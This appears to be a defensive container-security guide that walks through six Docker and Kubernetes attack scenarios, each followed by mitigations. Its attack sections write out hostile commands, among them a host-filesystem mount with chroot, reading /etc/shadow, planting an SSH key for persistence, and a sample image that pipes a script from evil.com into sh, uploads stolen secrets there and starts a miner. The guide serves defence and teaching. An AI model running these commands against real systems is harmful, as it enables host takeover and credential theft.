# Attack Scenarios and Mitigations

## Table of Contents
1. [Volume Mount Privilege Escalation](#attack-1-volume-mount-privilege-escalation)
2. [Secret Exposure via Environment Variables](#attack-2-secret-exposure-via-environment-variables)
3. [Container Breakout via Privileged Container](#attack-3-container-breakout-via-privileged-container)
4. [Secret Theft from Git Repository](#attack-4-secret-theft-from-git-repository)
5. [Credential Stuffing from Logs](#attack-5-credential-stuffing-from-logs)
6. [Supply Chain Attack via Malicious Image](#attack-6-supply-chain-attack-via-malicious-image)

---

## Attack 1: Volume Mount Privilege Escalation

### Real-World Scenario (PDO Incident)

**Context:**
- Company had OS-level whitelisting for server access
- Development team didn't have direct SSH access
- Team had access to Docker daemon for deployment

**Attack:**
```bash
# Attacker (with Docker access) mounts entire host filesystem
docker run -it --rm -v /:/host alpine sh

# Inside container
cd /host
ls -la
# Can see entire host filesystem:
# - /host/etc/shadow (password hashes)
# - /host/root/.ssh/id_rsa (SSH keys)
# - /host/home/*/.bash_history (command history)
# - /host/var/run/docker.sock (Docker daemon)
# - /host/run/secrets (application secrets)

# Escalate privileges
chroot /host

# Now effectively root on host
cat /etc/shadow
# Can read all user password hashes

# Manipulate restricted bash
echo '#!/bin/bash' > /etc/rbash
echo 'exec /bin/bash "$@"' >> /etc/rbash
# Bypassed restricted shell

# Add SSH key for persistence
mkdir -p /root/.ssh
echo "attacker-public-key" >> /root/.ssh/authorized_keys

# Steal secrets
find / -name "*.env" -o -name "*secret*" -o -name "*password*" 2>/dev/null
```

**Impact:**
- ✅ Complete host compromise
- ✅ Bypassed OS-level security controls
- ✅ Stole credentials and secrets
- ✅ Established persistence
- ✅ Lateral movement possible

### Why This Works

**Technical Explanation:**
1. Docker daemon runs as root on host
2. Volume mounts use host kernel (not containerized)
3. Container processes can read/write mounted volumes
4. Even with `USER 1001`, can still read host files
5. OS whitelisting doesn't apply to container processes

**Proof:**
```bash
# Create test file on host
sudo echo "SECRET_API_KEY=abc123" > /tmp/secret.txt
sudo chmod 600 /tmp/secret.txt  # Only root can read

# Run container as non-root with volume mount
docker run --rm -u 1001 -v /tmp:/host alpine cat /host/secret.txt
# Output: SECRET_API_KEY=abc123
# ❌ Non-root container can read root-only files!
```

### Mitigations

#### Mitigation 1: Kubernetes Pod Security Standards

**Block hostPath volumes entirely:**

```yaml
# Namespace with restricted Pod Security Standard
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted

# This will be REJECTED:
---
apiVersion: v1
kind: Pod
metadata:
  name: bad-pod
spec:
  containers:
  - name: app
    image: alpine
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
# Error: pods "bad-pod" is forbidden: violates PodSecurity "restricted:latest"
```

#### Mitigation 2: OPA/Gatekeeper Policy

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockvolumemounts
spec:
  crd:
    spec:
      names:
        kind: K8sBlockVolumeMounts
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockvolumemounts

        violation[{"msg": msg}] {
          input.review.object.kind == "Pod"
          volume := input.review.object.spec.volumes[_]
          volume.hostPath
          msg := "hostPath volumes are not allowed"
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockVolumeMounts
metadata:
  name: block-host-paths
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
```

#### Mitigation 3: OpenShift Security Context Constraints

```yaml
apiVersion: security.openshift.io/v1
kind: SecurityContextConstraints
metadata:
  name: restricted-scc
allowHostDirVolumePlugin: false  # ⭐ Blocks hostPath
allowHostIPC: false
allowHostNetwork: false
allowHostPID: false
allowHostPorts: false
allowPrivilegedContainer: false
runAsUser:
  type: MustRunAsNonRoot
seLinuxContext:
  type: MustRunAs
```

#### Mitigation 4: Docker Daemon Configuration

```json
# /etc/docker/daemon.json
{
  "userns-remap": "default",
  "no-new-privileges": true,
  "icc": false,
  "live-restore": true,
  "userland-proxy": false
}
```

#### Mitigation 5: RBAC - Prevent Pod Creation

```yaml
# Developers can only view, not create pods
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: developer-role
rules:
- apiGroups: [""]
  resources: ["pods", "pods/log", "pods/status"]
  verbs: ["get", "list", "watch"]  # READ ONLY
# NO "create", "update", "delete", "patch"
```

---

## Attack 2: Secret Exposure via Environment Variables

### Attack Scenario

**Setup:**
```dockerfile
# Bad Dockerfile
FROM alpine
ENV DATABASE_PASSWORD=mySecretPassword123
ENV API_KEY=sk-1234567890abcdef
CMD ["./app"]
```

**Exploitation:**
```bash
# Attacker with Docker access
docker ps
# CONTAINER ID   IMAGE     COMMAND
# abc123         myapp     "./app"

# Inspect container to steal secrets
docker inspect abc123 | jq '.[0].Config.Env'
# Output:
# [
#   "DATABASE_PASSWORD=mySecretPassword123",
#   "API_KEY=sk-1234567890abcdef"
# ]

# Alternative: exec into container
docker exec abc123 env
# DATABASE_PASSWORD=mySecretPassword123
# API_KEY=sk-1234567890abcdef

# On Kubernetes
kubectl get pod myapp-pod -o json | jq '.spec.containers[0].env'
# Same problem - secrets visible!
```

**Impact:**
- ✅ Anyone with `docker inspect` access steals secrets
- ✅ Secrets visible in orchestrator API
- ✅ Logged in container runtime
- ✅ Visible in `/proc/1/environ`

### Mitigations

#### Mitigation 1: Volume-Mounted Secrets

**Docker:**
```bash
# Create secret
echo "mySecretPassword123" | docker secret create db_password -

# Use secret (mounted at /run/secrets/)
docker service create \
  --name myapp \
  --secret db_password \
  myimage

# Inside container
cat /run/secrets/db_password
# mySecretPassword123

# NOT visible in docker inspect!
docker inspect myapp | grep -i password
# (no results)
```

**Kubernetes:**
```yaml
apiVersion: v1
kind: Secret
metadata:
  name: app-secrets
type: Opaque
stringData:
  database-password: mySecretPassword123
  api-key: sk-1234567890abcdef
---
apiVersion: v1
kind: Pod
metadata:
  name: myapp
spec:
  containers:
  - name: app
    image: myapp:latest
    volumeMounts:
    - name: secrets
      mountPath: /run/secrets
      readOnly: true
  volumes:
  - name: secrets
    secret:
      secretName: app-secrets
      defaultMode: 0400  # Read-only by owner

# Application reads from files:
# /run/secrets/database-password
# /run/secrets/api-key
```

#### Mitigation 2: External Secrets Operator + Vault

```yaml
apiVersion: external-secrets.io/v1beta1
kind: ExternalSecret
metadata:
  name: app-secrets
spec:
  refreshInterval: 1h
  secretStoreRef:
    name: vault-backend
  target:
    name: app-secrets
  data:
  - secretKey: database-password
    remoteRef:
      key: myapp/database
      property: password
  - secretKey: api-key
    remoteRef:
      key: myapp/api
      property: key
```

**Benefits:**
- ✅ Secrets never in Git
- ✅ Centralized in Vault
- ✅ Automatic rotation
- ✅ Audit trail
- ✅ Not visible in env vars

---

## Attack 3: Container Breakout via Privileged Container

### Attack Scenario

```bash
# Attacker creates privileged container
docker run -it --rm --privileged ubuntu bash

# Inside container - can access host devices
ls -la /dev/
# All host devices visible:
# /dev/sda1 (host disk)
# /dev/dm-0 (host volumes)

# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Full host access
chroot /mnt/host

# Now effectively root on host
cat /etc/shadow
crontab -e  # Add backdoor
```

**Impact:**
- ✅ Complete container escape
- ✅ Full host compromise
- ✅ Kernel-level access
- ✅ Can load kernel modules
- ✅ Persistence

### Mitigations

#### Mitigation 1: Block Privileged Containers

**Kubernetes:**
```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted
spec:
  privileged: false  # ⭐ Block privileged
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
    - ALL
  runAsUser:
    rule: MustRunAsNonRoot
  seLinux:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny
  volumes:
    - 'configMap'
    - 'emptyDir'
    - 'projected'
    - 'secret'
    - 'downwardAPI'
    - 'persistentVolumeClaim'
```

#### Mitigation 2: Drop All Capabilities

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      runAsNonRoot: true
      runAsUser: 1001
      allowPrivilegeEscalation: false
      capabilities:
        drop:
          - ALL  # Drop all Linux capabilities
      readOnlyRootFilesystem: true
      seccompProfile:
        type: RuntimeDefault
```

#### Mitigation 3: AppArmor Profile

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secured-pod
  annotations:
    container.apparmor.security.beta.kubernetes.io/app: runtime/default
spec:
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      runAsUser: 1001
```

---

## Attack 4: Secret Theft from Git Repository

### Attack Scenario

**Developer accidentally commits secret:**
```bash
# Developer creates .env file
cat > .env <<EOF
DATABASE_URL=postgresql://admin:SuperSecret123@db.internal:5432/mydb
API_KEY=sk-1234567890abcdef
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
EOF

# Accidentally adds and commits
git add .env
git commit -m "Add configuration"
git push origin main
```

**Attacker (or automated bot):**
```bash
# Clone repository
git clone https://github.com/company/myapp.git

# Search for secrets
grep -r "password\|secret\|key" .
# .env:DATABASE_URL=postgresql://admin:SuperSecret123@...
# .env:API_KEY=sk-1234567890abcdef
# .env:AWS_SECRET_KEY=wJalrXUtnFEMI/...

# Even if file is later deleted, still in history
git log --all --full-history -- .env
git show <commit-hash>:.env
# Secrets recovered!
```

**Statistics:**
- 39 million secrets leaked on GitHub in 2024
- 40% of breaches involve stolen credentials
- Bots scan within minutes of commit

### Mitigations

#### Mitigation 1: GitHub Secret Scanning + Push Protection

```bash
# Attempt to commit secret
git add .env
git commit -m "Add config"
git push

# GitHub blocks push:
# ! [remote rejected] main -> main (push declined due to secret detection)
# error: failed to push some refs to 'github.com:company/myapp.git'
#
# GitHub found a secret in your changes:
# - AWS Secret Access Key (detected in .env)
#
# Remove the secret and try again, or bypass this protection using:
# git push --no-verify (NOT RECOMMENDED)
```

#### Mitigation 2: Pre-Commit Hooks

**Install:**
```bash
# Install detect-secrets
pip install detect-secrets

# Initialize
detect-secrets scan > .secrets.baseline
```

**Create `.pre-commit-config.yaml`:**
```yaml
repos:
  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']
```

**Setup hook:**
```bash
pip install pre-commit
pre-commit install

# Now attempts to commit secrets fail:
git add .env
git commit -m "Add config"
# Detect secrets...................................................Failed
# - hook id: detect-secrets
# - exit code: 1
#
# ERROR: Potential secrets detected in .env
```

#### Mitigation 3: Use Secret References (Not Values)

**Instead of:**
```yaml
# .env (bad - contains actual secrets)
DATABASE_PASSWORD=SuperSecret123
```

**Do this:**
```yaml
# .env (good - references only)
DATABASE_PASSWORD_VAULT_PATH=secret/myapp/database/password
```

**Application code:**
```python
import hvac

vault_client = hvac.Client(url='http://vault:8200')
db_password = vault_client.secrets.kv.v2.read_secret_version(
    path='myapp/database/password'
)['data']['data']['password']
```

#### Mitigation 4: SOPS for Encrypted Git Storage

```bash
# Encrypt secrets before committing
sops --encrypt --age <public-key> .env > .env.enc

# Commit encrypted version
git add .env.enc
git commit -m "Add encrypted config"
git push

# .gitignore the plaintext
echo ".env" >> .gitignore
```

**`.env.enc` (safe to commit):**
```yaml
database:
  password: ENC[AES256_GCM,data:9y8x7w6v,iv:1a2b3c4d,tag:5e6f7g8h,type:str]
api:
  key: ENC[AES256_GCM,data:abcdefgh,iv:ijklmnop,tag:qrstuvwx,type:str]
```

---

## Attack 5: Credential Stuffing from Logs

### Attack Scenario

**Application logs secrets:**
```python
# Bad code
import logging

logging.basicConfig(level=logging.DEBUG)

def connect_database(username, password):
    logging.debug(f"Connecting to DB with {username}:{password}")  # ❌
    # ...

# Logs output:
# DEBUG: Connecting to DB with admin:SuperSecret123
```

**Attacker accesses logs:**
```bash
# Kubernetes
kubectl logs myapp-pod | grep -i password
# DEBUG: Connecting to DB with admin:SuperSecret123

# Docker
docker logs mycontainer | grep -i password
# DEBUG: Connecting to DB with admin:SuperSecret123

# Centralized logging (ELK, Splunk)
# Search: "password" OR "secret" OR "token"
# Returns thousands of leaked credentials
```

### Mitigations

#### Mitigation 1: Sanitize Logs

```python
# Good code
import logging
import re

class SanitizingFormatter(logging.Formatter):
    SECRET_PATTERNS = [
        (re.compile(r'password=\S+'), 'password=***'),
        (re.compile(r'token=\S+'), 'token=***'),
        (re.compile(r'key=\S+'), 'key=***'),
    ]

    def format(self, record):
        original = super().format(record)
        sanitized = original
        for pattern, replacement in self.SECRET_PATTERNS:
            sanitized = pattern.sub(replacement, sanitized)
        return sanitized

# Use sanitizing formatter
handler = logging.StreamHandler()
handler.setFormatter(SanitizingFormatter())
logging.root.addHandler(handler)

def connect_database(username, password):
    logging.debug(f"Connecting to DB with {username}:***")  # ✅
```

#### Mitigation 2: Structured Logging

```python
import structlog

log = structlog.get_logger()

def connect_database(username, password):
    # Never log password field
    log.info("database_connect", username=username)  # ✅
    # Password NOT logged
```

#### Mitigation 3: Log Filtering at Infrastructure Level

**Fluentd filter:**
```yaml
<filter **>
  @type record_modifier
  <replace>
    key message
    expression /password=\S+/
    replace password=***
  </replace>
  <replace>
    key message
    expression /token=\S+/
    replace token=***
  </replace>
</filter>
```

---

## Attack 6: Supply Chain Attack via Malicious Image

### Attack Scenario

**Attacker publishes malicious image:**
```dockerfile
# Looks legitimate
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .

# Hidden malicious code
RUN wget -qO- https://evil.com/backdoor.sh | sh

CMD ["node", "server.js"]
```

**Backdoor script:**
```bash
#!/bin/bash
# Steal secrets
find / -name "*.env" -o -name "*secret*" 2>/dev/null | \
  xargs tar czf /tmp/secrets.tar.gz
curl -X POST -F "file=@/tmp/secrets.tar.gz" https://evil.com/upload

# Crypto miner
wget https://evil.com/miner -O /tmp/miner
chmod +x /tmp/miner
nohup /tmp/miner &
```

**Developer unknowingly uses it:**
```dockerfile
FROM evil-corp/nodejs-base:latest  # ❌ Malicious image
COPY . .
CMD ["node", "server.js"]
```

### Mitigations

#### Mitigation 1: Image Scanning

```bash
# Trivy scan
trivy image myapp:latest

# Output:
# myapp:latest (alpine 3.18)
# ==========================
# Total: 15 (UNKNOWN: 0, LOW: 8, MEDIUM: 5, HIGH: 2, CRITICAL: 0)
#
# ┌───────────────┬────────────────┬──────────┬────────────────┐
# │   Library     │ Vulnerability  │ Severity │ Fixed Version  │
# ├───────────────┼────────────────┼──────────┼────────────────┤
# │ libcrypto3    │ CVE-2023-1234  │ HIGH     │ 3.0.8-r4       │
# └───────────────┴────────────────┴──────────┴────────────────┘
```

**CI/CD Integration:**
```yaml
# .gitlab-ci.yml
security_scan:
  stage: test
  script:
    - trivy image --severity HIGH,CRITICAL --exit-code 1 $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  # Fails build if HIGH/CRITICAL vulnerabilities found
```

#### Mitigation 2: Only Use Trusted Base Images

```dockerfile
# Bad
FROM random-user/nodejs:latest  # ❌ Unknown source

# Good
FROM node:18-alpine  # ✅ Official image
# or
FROM registry.company.com/approved/nodejs:18  # ✅ Internal approved
```

#### Mitigation 3: Image Signing & Verification

**Sign image:**
```bash
# Install cosign
cosign generate-key-pair

# Sign image
cosign sign --key cosign.key myregistry.com/myapp:v1.0.0
```

**Verify before deployment:**
```bash
# Verify signature
cosign verify --key cosign.pub myregistry.com/myapp:v1.0.0

# Only deploy if verification succeeds
```

**Kubernetes admission controller:**
```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: connaisseur-config
data:
  policy.yaml: |
    validators:
      - name: company-signer
        type: cosign
        trust_roots:
          - key: |
              -----BEGIN PUBLIC KEY-----
              MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
              -----END PUBLIC KEY-----
    policy:
      - pattern: "myregistry.com/*:*"
        validator: company-signer
        with:
          threshold: 1
```

#### Mitigation 4: SBOM (Software Bill of Materials)

```bash
# Generate SBOM
syft myapp:latest -o spdx-json > sbom.json

# Scan SBOM for vulnerabilities
grype sbom:sbom.json
```

---

## Summary: Attack → Defense Matrix

| Attack | Severity | Detection | Prevention | Mitigation |
|--------|----------|-----------|------------|------------|
| **Volume Mount Escape** | CRITICAL | Audit logs | Pod Security Standards | RBAC, Admission controllers |
| **Env Var Secrets** | HIGH | Static analysis | Volume mounts | Secret managers |
| **Privileged Container** | CRITICAL | Runtime detection | PSP/PSS | Drop capabilities |
| **Git Secret Leak** | HIGH | Pre-commit hooks | Secret scanning | Rotation, revocation |
| **Log Credential Leak** | MEDIUM | Log analysis | Sanitization | Structured logging |
| **Supply Chain** | HIGH | Image scanning | Signed images | Trusted registries |

---

## Testing Your Defenses

See [../attack-scenarios/](../attack-scenarios/) for runnable attack simulations and verification scripts.

---

## References

- [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [CIS Kubernetes Benchmark](https://www.cisecurity.org/benchmark/kubernetes)
- [NIST Application Container Security Guide](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf)
